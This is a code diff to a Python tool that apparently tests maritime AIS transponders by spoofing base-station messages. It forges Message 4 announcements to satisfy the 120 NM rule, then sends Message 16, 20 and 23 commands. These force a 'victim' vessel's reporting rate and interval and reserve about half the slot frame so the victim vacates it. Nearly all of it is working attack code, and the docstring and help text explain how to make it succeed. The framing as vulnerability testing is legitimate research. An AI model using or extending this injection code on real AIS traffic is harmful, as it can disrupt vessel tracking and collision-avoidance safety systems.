@@ -732,39 +732,37 @@ def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None):
 
 
 def build_chanmgmt_gentle(ctx):
-    """The base-station commands that do NOT change channels and do NOT lock a regional area --
-    M16 (rate), M20 (slots), M23 (group) -- so they all run in ONE clean pass with no position
-    jumping and no recovery needed. Built the same minimal way as the switch that worked: the base
-    is announced as its OWN step (re-announced before each group so it stays established), and each
-    command is sent ALONE, base then ship for the authority read. The unit stays on AIS1/AIS2
-    throughout, so nothing here can strand it."""
+    """M16 (rate), M20 (slots), M23 (group) in one clean pass, no channel change, no jumping.
+    SPEC-CORRECTED (M.1371-5): unlike the M22 switch, these require the 120 NM rule -- the mobile
+    must have RECEIVED a base Message 4 from the same MMSI and computed it is within 120 NM before
+    it acts (Table 42; Message 20/23 text). So the runner establishes the base firmly first, and
+    every command here is prefixed with a fresh Msg 4 to keep the base alive within the 3-min
+    window. Encodings per spec: M16 rate assignment sets increment=0 and offset=reports/10 min
+    (Table 67 note 1; max 600); M23 reporting-interval field 11 = 2 s (Table 77); M20 reservation
+    blocks are capped at 5 slots (was 15, out of spec) and repeated with increment=10 to force the
+    victim to vacate ~half the frame."""
     V = ctx.victim_mmsi
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
-    def ann():
-        return ("cm_announce_base",
-                [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
-                  "Msg4 base-station announcement")])
-    def m20b(src):
-        return [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
-                 f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement (keep base alive for the 120 NM rule)")
+    def m20dense(src):
+        return [m4, (enc.encode_type20(src, offset1=0, slots1=5, timeout1=7, increment1=10),
+                     "M20 reserve 5 slots every 10 (~50% of the frame) -> forces slot vacation")]
     return [
-        ann(),
-        ("cm_m16_base",    [(enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
-                             "M16 (base) force MAX reporting rate 600/10min")]),
-        ("cm_m16_ship",    [(enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
-                             "M16 (ordinary ship) force MAX rate -- authority test")]),
-        ("cm_m16_release", [(enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
-                             "M16 (base) release rate (autonomous wins)")]),
-        ann(),
-        ("cm_m20_base",    m20b(BASE_MMSI)),
-        ("cm_m20_ship",    m20b(REGULAR_MMSI)),
-        ann(),
-        ("cm_m23_base",    [(_m23_group(BASE_MMSI, vlat, vlon, interval=11),
-                             "M23 (base) group slow reporting interval")]),
-        ("cm_m23_ship",    [(_m23_group(REGULAR_MMSI, vlat, vlon, interval=11),
-                             "M23 (ordinary ship) group slow -- authority test")]),
-        ("cm_m23_clear",   [(_m23_group(BASE_MMSI, vlat, vlon, interval=0),
-                             "M23 (base) clear group assignment")]),
+        ("cm_m16_base",    [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
+                                 "M16 (base) assign 600 reports/10min (=2s), increment=0")]),
+        ("cm_m16_ship",    [m4, (enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
+                                 "M16 (ordinary ship) assign max rate -- authority test")]),
+        ("cm_m16_release", [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
+                                 "M16 (base) release to 20 reports/10min")]),
+        ("cm_m20_base",    m20dense(BASE_MMSI)),
+        ("cm_m20_ship",    m20dense(REGULAR_MMSI)),
+        ("cm_m23_base",    [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=11),
+                                 "M23 (base) reporting interval field 11 = 2s over the region")]),
+        ("cm_m23_ship",    [m4, (_m23_group(REGULAR_MMSI, vlat, vlon, interval=11),
+                                 "M23 (ordinary ship) 2s interval -- authority test")]),
+        ("cm_m23_clear",   [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=0),
+                                 "M23 (base) clear (interval 0 = autonomous)")]),
     ]
 
 
@@ -1028,7 +1026,10 @@ def main():
     ap.add_argument("--chanmgmt-gentle", action="store_true",
                     help="run ONLY the non-channel base-station commands (M16 rate, M20 slots, M23 "
                          "group), base then ship, in one clean pass -- no channel change, no "
-                         "position jumping, no stranding. Same minimal style as --chanmgmt-switch-only.")
+                         "position jumping, no stranding. Establishes the base first (120 NM rule).")
+    ap.add_argument("--gentle-establish", type=float, default=90.0,
+                    help="seconds to broadcast Msg 4 up front so the unit registers the base and "
+                         "computes it is within 120 NM before M16/M20/M23 (which require it)")
     ap.add_argument("--chanmgmt-switch-only", action="store_true",
                     help="run ONLY the channel switch (announce + regional Msg 22 to the alt "
                          "channels, ship then base). The unit locks a regional area after the first "
@@ -1273,6 +1274,19 @@ def main():
             print("    baseline: 60s, victim on AIS1/AIS2, no injection ...")
             time.sleep(60)
             rec(event="gentle_baseline_end")
+            # Establish the base FIRMLY: M16/M20/M23 need the mobile to have received a Msg 4 from
+            # this base and computed it is within 120 NM (M.1371-5). The switch (M22) skipped this
+            # because the 120 NM rule does not apply to M22. Broadcast Msg 4 steadily up front.
+            m4b = enc.encode_type4(BASE_MMSI, ctx.victim_lat + 0.2, ctx.victim_lon + 0.2,
+                                   hour=12, minute=0, second=0)
+            print(f"    establishing base station: broadcasting Msg 4 for {args.gentle_establish:.0f}s "
+                  f"(120 NM rule) ...")
+            rec(event="base_establish_start", seconds=args.gentle_establish, base_mmsi=BASE_MMSI)
+            _end = time.time() + args.gentle_establish
+            while time.time() < _end:
+                ws.send(m4b)
+                time.sleep(2)
+            rec(event="base_establish_end")
             for i, (name, payloads) in enumerate(cg):
                 src = "ship" if "ship" in name else "base"
                 if   "m20" in name: cmd = "M20"
